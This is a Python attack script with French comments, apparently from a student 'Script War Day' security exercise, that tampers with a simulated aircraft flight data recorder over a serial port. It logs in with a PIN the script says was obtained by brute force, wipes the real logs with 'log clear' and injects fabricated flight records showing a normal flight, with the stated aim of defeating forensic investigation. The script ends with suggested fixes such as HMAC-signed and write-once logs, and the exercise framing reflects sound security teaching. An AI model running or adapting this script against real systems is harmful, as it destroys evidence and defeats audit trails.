#!/usr/bin/env python3
"""
log_poison.py — Attaque d'integrite : injection de faux logs FDR (VH10)
GUARDIA B1 — Script War Day, objectif A13

Principe :
    logs_cmd_ecrire() n'effectue aucune validation du contenu.
    Un attaquant authentifie peut ecrire des entrees FDR factices
    indiscernables des vraies, ou effacer les donnees reelles et
    les remplacer par des faux.

    C'est une attaque d'INTEGRITE (pas de confidentialite) :
    l'objectif est de rendre l'investigation forensique impossible.

    CWE-117 (Improper Output Neutralization for Logs)
    CWE-20  (Improper Input Validation)
    Ref : OPM breach (2015) — manipulation de journaux d'audit

Usage :
    python log_poison.py COM3 --pin 0000
    python log_poison.py COM3 --pin 0000 --no-clear
"""

import serial
import time
import sys
import argparse


FAKE_FDR = [
    "T+0312 ALT=8000ft SPD=250kt HDG=090 FLAPS=0",
    "T+0314 ALT=8200ft SPD=255kt HDG=092 NORMAL",
    "T+0316 ALT=8500ft SPD=260kt HDG=095 ENG1:N1=85%",
    "T+0318 ALT=8800ft SPD=265kt HDG=098 ALL_GREEN",
    "T+0320 ALT=9100ft SPD=270kt HDG=100 GPS:48.86,2.35",
]


def ouvrir_port(port, baud=115200, timeout=2.0):
    try:
        ser = serial.Serial(port, baud, timeout=timeout)
        time.sleep(0.3)
        ser.reset_input_buffer()
        return ser
    except serial.SerialException as e:
        print(f"[!] Impossible d'ouvrir {port} : {e}")
        sys.exit(1)


def envoyer_commande(ser, commande, attente=1.0):
    ser.reset_input_buffer()
    for c in commande:
        ser.write(c.encode())
        time.sleep(0.02)
    ser.write(b"\r\n")
    time.sleep(attente)
    reponse = ser.read(ser.in_waiting or 1024).decode(errors="replace")
    return reponse


def main():
    parser = argparse.ArgumentParser(
        description="Log Poison — injection de faux FDR (VH10)"
    )
    parser.add_argument("port", help="Port serie de la cible (ex: COM3)")
    parser.add_argument("--pin", required=True,
                        help="PIN pour se connecter (obtenu via brute force/timing)")
    parser.add_argument("--no-clear", action="store_true",
                        help="Ne pas effacer les logs avant injection")
    args = parser.parse_args()

    print("=" * 55)
    print("  LOG POISON — BlackBox B1 GUARDIA")
    print("=" * 55)
    print(f"  Port   : {args.port}")
    print(f"  PIN    : {args.pin}")
    print(f"  Cible  : VH10 — injection faux FDR")
    print(f"  Mode   : {'injection seule' if args.no_clear else 'clear + injection'}")
    print("=" * 55)
    print()

    ser = ouvrir_port(args.port)

    # Prompt initial
    envoyer_commande(ser, "", attente=0.5)

    # ---- Connexion ----
    print(f"[*] Connexion avec PIN {args.pin}...")
    rep = envoyer_commande(ser, f"login {args.pin}", attente=1.5)
    if "reussie" not in rep.lower():
        print(f"    [!] Login echoue : {rep.strip()[:60]}")
        print("    Verifiez le PIN. Tentez brute_force.py ou timing_attack.py d'abord.")
        ser.close()
        sys.exit(1)
    print("    [+] Connexion reussie")
    print()

    # ---- Sauvegarde des vrais logs ----
    print("[*] Lecture des logs actuels (sauvegarde)...")
    rep = envoyer_commande(ser, "log read", attente=1.5)
    lignes_log = [l.strip() for l in rep.split("\n")
                  if l.strip() and "bb" not in l[:4] and "Log" not in l[:4]
                  and "---" not in l and "log read" not in l]
    print(f"    {len(lignes_log)} entrees trouvees")
    for l in lignes_log[:5]:
        print(f"      {l[:70]}")
    if len(lignes_log) > 5:
        print(f"      ... ({len(lignes_log) - 5} de plus)")
    print()

    # ---- Effacement ----
    if not args.no_clear:
        print("[*] Effacement des logs (log clear)...")
        rep = envoyer_commande(ser, "log clear", attente=1.0)
        if "efface" in rep.lower():
            print("    [+] Logs effaces")
        else:
            print(f"    [?] Reponse : {rep.strip()[:60]}")
        print()

    # ---- Injection des faux FDR ----
    print("[*] Injection de faux enregistrements FDR...")
    for i, fdr in enumerate(FAKE_FDR):
        rep = envoyer_commande(ser, f"log write {fdr}", attente=0.8)
        ok = "enregistre" in rep.lower() or "ok" in rep.lower()
        status = "[+]" if ok else "[?]"
        print(f"    {status} [{i+1}/{len(FAKE_FDR)}] {fdr[:55]}")

    print()

    # ---- Verification ----
    print("[*] Verification (log read)...")
    rep = envoyer_commande(ser, "log read", attente=1.5)
    print()
    print("--- Logs apres injection ---")
    for line in rep.split("\n"):
        line = line.strip()
        if line:
            print(f"  {line}")
    print("----------------------------")
    print()

    # ---- Deconnexion ----
    envoyer_commande(ser, "logout", attente=0.5)

    # ---- Rapport ----
    print("=" * 55)
    print("  RAPPORT")
    print("=" * 55)
    print(f"  [+] VH10 PRESENTE — aucune validation du contenu des logs")
    print(f"  [+] {len(FAKE_FDR)} faux enregistrements FDR injectes")
    if not args.no_clear:
        print(f"  [+] {len(lignes_log)} vrais enregistrements detruits")
    print()
    print("  Impact :")
    print("    - L'investigation forensique est COMPROMISE")
    print("    - Les faux logs montrent un vol NORMAL (pas d'incident)")
    print("    - Les vrais logs (alertes, panne moteur) sont perdus")
    print()
    print("  Correction necessaire :")
    print("    - Signature des logs (HMAC ou compteur monotone)")
    print("    - Validation du format des entrees")
    print("    - Logs en write-once (pas de clear possible)")
    print()

    ser.close()


if __name__ == "__main__":
    main()
